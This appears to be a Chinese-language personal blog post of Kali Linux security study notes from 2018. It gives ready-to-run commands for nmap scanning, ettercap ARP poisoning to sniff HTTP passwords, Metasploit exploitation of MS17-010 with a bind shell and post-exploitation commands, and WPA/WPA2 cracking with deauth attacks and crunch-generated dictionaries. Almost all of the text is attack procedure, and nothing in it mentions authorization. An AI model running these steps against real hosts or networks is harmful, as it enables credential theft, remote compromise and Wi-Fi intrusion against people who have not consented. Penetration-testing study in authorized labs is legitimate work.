---
title: "网络安全笔记（kali）"
description: "网络安全笔记（kali）"
date: 2018-06-02T16:57:56+08:00
categories:
  - 学习
tags:
  - Linux
---

## NMAP扫描

中文文档：http://www.nmap.com.cn/doc/manual.shtm

```shell
nmap # 帮助 -h可省略
nmap 192.168.1.1 # 最简单的命令
nmap -v 192.168.1.1 # 提高输出信息的详细度
nmap -vv 192.168.1.1 # 更详细
nmap -A 192.168.1.1 # 启用了操作系统检测(-O)和版本扫描(-sV)，以后会增加更多的功能
nmap -p 1-1024 192.168.1.1 # 只扫描1-1024端口
nmap -p 1-1024 -A 192.168.209.0/24 # 扫描192.168.209.0/24网段主机的1-1024端口，同时启用系统检测和版本扫描
```

## ARP欺骗获取账号密码(ARP欺骗和MITM攻击)

```shell
ettercap -G # 启用ettercap的GUI
```
- Sniff - Unified sniffing - 选择网卡(一般eth0) - 确定
- Hosts - Host List - 选择两个目标(一般是目标主机和网关)并添加到Target 1/2
- Mitm - Arp poisoning - 勾选Sniff remote connections - OK
- HTTP账号密码会自动抓取并显示
- View - Connections
```shell
# 其它工具和命令
arpspoof
```

## MSF入侵主机

```shell
msfupdate # 更新msf
msfconsole # 启动msf
help # 帮助
search ms17-010 # 查找ms17-010相关的模块
use exploit/windows/smb/ms17_010_psexec # 使用模块 exploit/windows/smb/ms17_010_psexec
show options # 显示选项
set RHOST 192.168.209.129 # 设置RHOST的值为192.168.209.129
exploit # 发起攻击
```

其它资料：https://blog.csdn.net/qq_29701419/article/details/48975769

```shell
# msf载荷，可选
show payloads # 显示载荷
set payload windows/shell/bind_tcp # 使用载荷 windows/shell/bind_tcp
```

```shell
# 入侵成功后的命令
help # 帮助
sysinfo # 系统信息
screenshot # 截屏
shell # 进入系统命令行
```

##Aircrack-ng破解WiFi密码（WPA/WPA2）

```shell
ifconfig # 查看无线网卡名称，这里假设我的是wlan0
airmon-ng start wlan0 # 将wlan0改成monitor模式。关于无线网卡的模式，请另行百度。
airodump-ng wlan0 # 启动抓包工具airodump-ng，选择无线网卡wlan0
# 然后选择你要破解的WiFi的BSSID，记下它的信道（channel），这里假设我的目标的BSSID是AA:AA:AA:AA:AA:AA，信道是1。抓包保存的文件名为test。
# airodump-ng -c [the BSSID's chanel] -w [output capfile's name] --bssid [BSSID] [interface]
airodump-ng -c 1 -w test --bssid AA:AA:AA:AA:AA:AA wlan0
# 接下来等待握手包。当有客户端连接WiFi时就会产生握手包。我们可以慢慢等待，或者用deauth攻击让客户端掉线重连。
# 我们可以选择一个客户端，记下他的MAC地址，然后新开一个终端，进行deauth攻击。这里假设它的MAC地址是BB:BB:BB:BB:BB:BB。我们发10个deauth包。
# aireplay-ng -0 [number] -a [BSSID] -c [user's MAC] [interface]
aireplay-ng -0 10 -a AA:AA:AA:AA:AA:AA -c BB:BB:BB:BB:BB:BB wlan0
# 然后用户就会掉线，我们等它自动重连，然后我们就会得到握手包。airodump-ng界面会显示“WPA handshake”。
# 然后我们用字典进行破解。这里假设字典为dict.txt
# aircrack-ng -w [dictionary's name] [capfile's name(for example:aaa-01.cap)]
aircrack-ng -w dict.txt test.cap
# 然后就等密码出来了。当然，如果密码不在字典里面，是跑不出来的。

# PS：我们可以用crunch来生成字典。这里生成一个0-9组成的8位数字典（即00000000-99999999），输出dict.txt。
crunch 8 8 0123456789 -o dict.txt
# 如果WiFi密码是八位数，用这个字典就能跑出来了。
# 从攻击过程我们可以知道，相对于密码复杂度，密码长度更重要。如果只是纯数字的密码，每增加一位，平均破解时间增加十倍。不过如果是手机号做密码，那就另当别论，手机号虽然是13位，但数量并不是10^13那么多。
```